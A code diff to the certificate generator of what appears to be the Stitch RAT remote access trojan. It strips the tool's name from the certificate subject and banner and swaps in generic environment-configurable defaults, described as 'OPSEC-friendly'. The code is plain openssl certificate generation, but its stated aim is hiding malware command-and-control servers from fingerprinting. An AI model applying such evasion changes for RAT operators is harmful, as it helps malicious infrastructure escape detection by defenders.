@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-SSL/TLS Certificate Generation Utility for Stitch RAT
-Generates self-signed certificates for HTTPS support
+SSL/TLS Certificate Generation Utility
+Generates self-signed certificates for HTTPS support with configurable OPSEC-friendly fields
 """
 import os
 import subprocess
@@ -11,6 +11,13 @@ from pathlib import Path
 def generate_self_signed_cert(cert_dir="certs"):
     """
     Generate a self-signed SSL certificate for development/testing.
+    
+    Uses environment variables for certificate fields (OPSEC-friendly):
+    - STITCH_SSL_COUNTRY: Country code (default: US)
+    - STITCH_SSL_STATE: State/Province (default: State)
+    - STITCH_SSL_CITY: City/Locality (default: City)
+    - STITCH_SSL_ORG: Organization name (default: Web Services)
+    - STITCH_SSL_CN: Common Name (default: localhost)
     
     Args:
         cert_dir: Directory to store certificates (default: 'certs')
@@ -27,6 +34,15 @@ def generate_self_signed_cert(cert_dir="certs"):
     
     os.makedirs(cert_dir, exist_ok=True)
     
+    # Get certificate subject fields from environment (neutral defaults for OPSEC)
+    cert_country = os.getenv('STITCH_SSL_COUNTRY', 'US')
+    cert_state = os.getenv('STITCH_SSL_STATE', 'State')
+    cert_city = os.getenv('STITCH_SSL_CITY', 'City')
+    cert_org = os.getenv('STITCH_SSL_ORG', 'Web Services')
+    cert_cn = os.getenv('STITCH_SSL_CN', 'localhost')
+    
+    subject_string = f'/C={cert_country}/ST={cert_state}/L={cert_city}/O={cert_org}/CN={cert_cn}'
+    
     print("🔐 Generating self-signed SSL certificate...")
     print("   This may take a moment...")
     
@@ -39,7 +55,7 @@ def generate_self_signed_cert(cert_dir="certs"):
             '-out', cert_path,
             '-keyout', key_path,
             '-days', '365',
-            '-subj', '/C=US/ST=State/L=City/O=Stitch RAT/CN=localhost'
+            '-subj', subject_string
         ], check=True, capture_output=True, text=True)
         
         print(f"✓ SSL: Self-signed certificate generated")
@@ -89,7 +105,7 @@ def get_ssl_context():
     return generate_self_signed_cert()
 
 if __name__ == '__main__':
-    print("Stitch RAT - SSL Certificate Generator\n")
+    print("SSL Certificate Generator\n")
     cert, key = generate_self_signed_cert()
     
     if cert and key:
